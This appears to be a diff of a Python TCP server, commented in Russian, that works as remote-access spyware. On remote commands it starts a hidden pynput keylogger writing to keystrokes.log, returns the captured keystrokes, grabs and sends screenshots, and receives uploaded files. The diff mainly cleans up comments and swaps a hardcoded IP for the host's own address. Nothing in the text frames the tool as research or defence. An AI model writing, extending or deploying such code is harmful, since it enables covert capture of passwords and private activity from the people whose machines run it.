@@ -5,11 +5,8 @@ import atexit
 import os
 import struct
 import sys
-
 import pyautogui
-from pynput.keyboard import Listener  # Импортируем Listener из библиотеки pynput
-
-addr = '192.168.0.107'
+from pynput.keyboard import Listener
 
 # Константы
 FILE_NAME = "./keystrokes.log"
@@ -17,21 +14,17 @@ recording = False
 output = None
 keyboard_listener = None  # Хранить слушателя клавиатуры
 
-
 # Функция для записи в лог
 def log_action(action):
     print(f"Logging action: {action}")
     with open(FILE_NAME, "a") as f:
         f.write(action + "\n")
 
-
-
 # Функция для очистки лог-файла
 def clear_log_file():
     with open(FILE_NAME, "w") as f:
         f.truncate()  # Очищаем содержимое файла
     log_action("Log file cleared.")  # Записываем в лог, что файл очищен
-
 
 # Функция для записи нажатий клавиш
 def on_press(key):
@@ -40,7 +33,6 @@ def on_press(key):
     except AttributeError:
         log_action(f"Special key pressed: {key}")  # Записываем специальные клавиши (Shift, Ctrl и т.д.)
 
-
 # Функция для завершения работы
 def onexit():
     if output:
@@ -48,15 +40,14 @@ def onexit():
     if keyboard_listener:
         keyboard_listener.stop()  # Останавливаем слушатель
 
-
 # Обработка входящих соединений
 def handle_client(conn):
     global recording, output, keyboard_listener
-    print("Client connected from {}".format(addr))
+    print("Client connected")
 
-    # Отправка IP-адреса клиента
-    ip_address = addr[0]
-    conn.sendall(f"CLIENT_IP:{ip_address}".encode('utf-8'))
+    # Отправка IP-адреса сервера
+    ip_address = socket.gethostbyname(socket.gethostname())
+    conn.sendall(f"SERVER_IP:{ip_address}".encode('utf-8'))
 
     while True:
         command = conn.recv(1024).decode('utf-8')
@@ -67,15 +58,15 @@ def handle_client(conn):
 
         if command == "keylogger_start":
             if not recording:
-                print("Attempting to start keylogger...")  # Отладочное сообщение
+                print("Attempting to start keylogger...")
                 recording = True
                 output = open(FILE_NAME, "a")
                 atexit.register(onexit)
                 log_action("Started recording keyboard inputs.")
-                print("Starting Listener...")  # Отладочное сообщение
+                print("Starting Listener...")
                 keyboard_listener = Listener(on_press=on_press)
                 keyboard_listener.start()
-                print("Listener started...")  # Проверка успешного запуска слушателя
+                print("Listener started...")
                 conn.sendall("Keylogger started.".encode('utf-8'))
                 print("Keylogger started.")
 
@@ -83,16 +74,15 @@ def handle_client(conn):
                 conn.sendall("Keylogger is already running.".encode('utf-8'))
 
         elif command == "keylogger_stop":
-            if recording:  # Проверка, идет ли запись
+            if recording:
                 recording = False
                 log_action("Stopped recording.")
                 if keyboard_listener:
-                    keyboard_listener.stop()  # Останавливаем слушатель клавиатуры
+                    keyboard_listener.stop()
                 conn.sendall("Keylogger stopped.".encode('utf-8'))
                 print("Keylogger stopped.")
             else:
                 conn.sendall("Keylogger is not running.".encode('utf-8'))
-
 
         elif command == "keylogger_show":
             with open(FILE_NAME, "r") as f:
@@ -108,10 +98,9 @@ def handle_client(conn):
 
         elif command == "screenshot":
             screenshot = pyautogui.screenshot()
-            imageBytes = pickle.dumps(screenshot)  # Сериализация изображения
-            conn.sendall(struct.pack(">Q", len(imageBytes)) + imageBytes)  # Отправка размера и байтов изображения
+            imageBytes = pickle.dumps(screenshot)
+            conn.sendall(struct.pack(">Q", len(imageBytes)) + imageBytes)
             print("Screenshot sent.")
-
 
         elif command.startswith("receive_file:"):
             file_name = command.split(":")[1]
@@ -121,7 +110,7 @@ def handle_client(conn):
             # Получаем размер файла
             packed_file_size = conn.recv(8)
             file_size = struct.unpack(">Q", packed_file_size)[0]
-            print("Receiving file of size {} bytes...")
+            print("Receiving file of size {} bytes...".format(file_size))
 
             # Получаем и сохраняем файл
             received_size = 0
@@ -167,8 +156,6 @@ def handle_client(conn):
         else:
             conn.sendall(b"Command not recognized")
 
-
-# Основная функция для запуска сервера
 # Основная функция для запуска сервера
 def start_server():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
@@ -180,7 +167,6 @@ def start_server():
             print("Connection from {}".format(addr))
             conn.sendall(b"SERVER_READY")  # Уведомляем клиента о готовности сервера
             threading.Thread(target=handle_client, args=(conn,)).start()
-
 
 if __name__ == "__main__":
     try:
